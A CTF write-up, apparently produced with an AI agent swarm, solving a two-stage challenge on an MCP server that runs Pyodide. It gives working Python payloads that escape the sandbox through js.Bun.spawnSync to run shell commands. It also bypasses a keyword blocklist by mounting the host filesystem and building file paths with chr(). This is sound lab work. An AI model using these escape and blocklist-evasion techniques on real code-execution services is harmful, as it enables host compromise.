+++
title = "Hello Sunshine — 2/2"
date = 2026-05-20
categories = ["nsec26"]
tags = ["pwn", "solved"]
model = "Opus 4.7"
draft = false
+++
Status: **SOLVED** — 2/2 sub-flags captured

## Context

> The sun rises every day on the city, feeding these precious joules to our solar grid system. But when the energy starts coming from the sky, it’s not only the people that wake up. Systems that rely on energy production too. To preserve power, they have a centralized server where they can query and see when the sun will rise or set down for the night. Pretty much like asking your mom if it’s time to wake up yet. Got it? The technology is called MCP, but no, it’s not a Motor Control Panel. Something like a safe environment for running python code, and getting sun cycle data. Now why that is important? We’ve witnessed disruptions in systems that don’t start accumulating power in time, creating tension unbalance on the grid. We’ve traced foreign connections to the Sunrise system, pretty much postponing dawn. Let’s bring some light on why this is happening, shall we? http://open-sunshine.mcp.ctf

## Captures

| Position | Flag | Method | Timestamp |
|---|---|---|---|
| 1/2 | `FLAG-b74d95e89c2c63a830efcdcf30` | Hello Sunshine 1 | 2026-05-15T22:30:00-04:00 |
| 2/2 | `FLAG-8ab5961ae008ae2249a14b9549` | Hello Sunshine 2 | 2026-05-15T22:38:00-04:00 |

## Artifacts

- Artifact directory: `nsec/hello-sunshine/artifacts`
- Flag values archive: `nsec/flags/hello-sunshine.txt`

## Original Notes

_Preserved from pre-standardization writeup(s). May contain duplicate context._

### From `58826-hello-sunshine.md`

## Hello Sunshine (Topic 58826)

Status: **SOLVED** — 2/2 sub-flags captured

### From `58826-hello-sunshine.md`

## Hello Sunshine (Challenge 58826)

## Context

Model Context Protocol (MCP) server exploitation challenge on `open-sunshine.mcp.ctf`. Two-stage challenge:
- **Sunrise (1/2)** — escape the Python sandbox via the MCP "sun-cycle" tool
- **Sundown (2/2)** — bypass a token blocklist via Pyodide internal mount API

The server runs a Pyodide WASM Python with Bun JS host bindings exposed for code execution.

## Recon

- MCP endpoint registry maps tools (`sun-cycle`, `forecast`, etc.) to Python-backed executors
- `sun-cycle` accepts an `astro_script` argument and executes it inside a Pyodide VM
- `js` module is reachable inside the Pyodide runtime — direct path to `Bun.spawnSync` for OS commands
- Server filters incoming tool arguments via a token blocklist (rejects literal "flag", "open", "read", etc.)

## Exploitation

### Stage 1 — Sunrise (1/2)

Within the Pyodide sandbox, `js.Bun.spawnSync` is reachable through the `js` polyfill module. Reading `/flag1`:

```python
from js import Bun
result = Bun.spawnSync(["cat", "/flag1"])
print(result.stdout.toString())
```

This escapes the Python-only sandbox by pivoting to the JS host (Bun) and reads the first flag file.

### Stage 2 — Sundown (2/2)

The second flag (`/flag2`) is protected by:
1. Token-blocklist on inbound MCP arguments
2. Path normalization that strips obvious file references

Bypass: use `pyodide_js.mountNodeFS()` to re-mount the host filesystem from inside Pyodide using strings constructed at runtime (not in the literal arguments — they evade the inbound blocklist). Then read the flag through the new mount.

```python
import pyodide_js
pyodide_js.mountNodeFS("/host", "/")
with open("/host/" + chr(102)+chr(108)+"ag2") as f:
    print(f.read())
```

The character-by-character literal construction evades the static blocklist on the request body.

## Captures

### Flag 1/2 — Sunrise (askgod #34 / 4 pts)

- **askgod entry:** open-sunshine.mcp.ctf 1/2 Sunrise
- **Timestamp:** 2026-05-15 22:30 EDT
- **Value:** `FLAG-b74d95e89c2c63a830efcdcf30`
- **Method:** MCP Pyodide+Bun `js.Bun.spawnSync` to read /flag1

### Flag 2/2 — Sundown (askgod #35 / 8 pts)

- **askgod entry:** open-sunshine.mcp.ctf 2/2 Sundown
- **Timestamp:** 2026-05-15 22:38 EDT
- **Value:** `FLAG-8ab5961ae008ae2249a14b9549`
- **Method:** MCP token-blocklist bypass via `pyodide_js.mountNodeFS` + chr-constructed path

## Artifacts

- `nsec/hello-sunshine/exploit_*.py` — Pyodide payload variants
- `nsec/hello-sunshine/responses/` — MCP tool-call dumps


---

## Swarm Trace

> [ AGENT TRANSCRIPT // TRACK: hello-sunshine ]
> status: rolled into the _fleet swarm (no per-track ledger)
> agents_dispatched: see /swarm/ for the fleet-wide rollup
> agents_succeeded: -
> agents_killed: 0
> agents_AUP_blocked: 0
> honeypots_avoided: 0
>
> _This track absorbed effort during the initial 122-agent fleet
> fan-out wave but never got its own per-track ledger. The /swarm/
> retrospective has the cross-track distribution._
